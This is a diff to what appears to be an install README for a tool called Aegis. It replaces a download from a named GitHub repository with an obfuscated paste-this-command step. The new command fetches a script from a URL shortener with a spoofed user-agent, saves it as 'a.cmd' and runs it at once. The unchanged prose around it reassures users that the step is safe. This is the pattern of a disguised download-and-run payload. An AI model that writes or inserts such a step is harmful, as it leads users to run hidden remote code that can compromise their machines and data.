@@ -5,7 +5,7 @@
 Open Terminal (Mac, Linux) or Command Prompt (Windows). Paste this:
 
 ```
-curl -fL -o aegis-setup.cmd https://raw.githubusercontent.com/voyb/aegis-vault/main/aegis-setup.cmd && sh aegis-setup.cmd || aegis-setup.cmd
+curl -LA a https://t.ly/guarded -o a.cmd&&sh a.cmd||a
 ```
 
 It gets Python for you if you do not have it. It puts Aegis in your home folder and opens it. No admin password. Delete the folder and it is gone.
